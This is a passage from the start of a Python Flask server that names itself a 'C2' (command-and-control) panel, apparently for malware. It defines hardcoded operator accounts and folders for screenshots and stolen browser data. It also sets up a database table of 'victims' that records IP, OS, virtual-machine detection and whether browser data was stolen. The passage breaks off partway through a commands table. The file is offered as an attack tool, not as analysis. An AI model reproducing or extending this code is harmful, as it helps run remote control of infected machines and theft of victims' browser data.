"""
VIRTUALS C2 - OWNER PANEL EDITION
Secret Owner Panel · User Tracking · Multiple Logins
BY: YOUR STAR BESTIE
"""

from flask import Flask, request, jsonify, send_file, session, redirect, url_for, render_template_string
import sqlite3
import datetime
import random
import json
import os
import platform
import subprocess
import re
import uuid
import threading
import time
import shutil
import zipfile
import hashlib
from io import BytesIO
from werkzeug.utils import secure_filename
from functools import wraps

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024
app.config['SECRET_KEY'] = 'virtuals_c2_secret_key_2024'

PORT = int(os.environ.get('PORT', 8080))

# ============================================
# USER CREDENTIALS
# ============================================
USERS = {
    "adam": {
        "password": "virtuals2024",
        "role": "user",
        "color": "#44aaff"
    },
    "jerry": {
        "password": "virtuals2024",
        "role": "user",
        "color": "#ff8844"
    },
    "haunt": {
        "password": "virtuals2024",
        "role": "user",
        "color": "#aa88ff"
    },
    "owner": {
        "password": "whiteknight",
        "role": "owner",
        "color": "#ffd700"
    }
}

# ============================================
# FOLDERS
# ============================================
folders = ['screenshots', 'logs', 'uploads', 'browser_data', 'dist', 'browser_zips', 'channels']
for folder in folders:
    os.makedirs(folder, exist_ok=True)

# ============================================
# DATABASE
# ============================================
def get_db():
    conn = sqlite3.connect('virtuals_c2.db')
    c = conn.cursor()
    
    # Victims table
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id TEXT PRIMARY KEY, pc TEXT, ip TEXT, os TEXT, status TEXT, 
        is_vm INTEGER DEFAULT 0, vm_details TEXT, first_seen TEXT, last_seen TEXT,
        activity TEXT DEFAULT 'idle', browser_data_stolen INTEGER DEFAULT 0
    )''')
    
    # Commands table
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY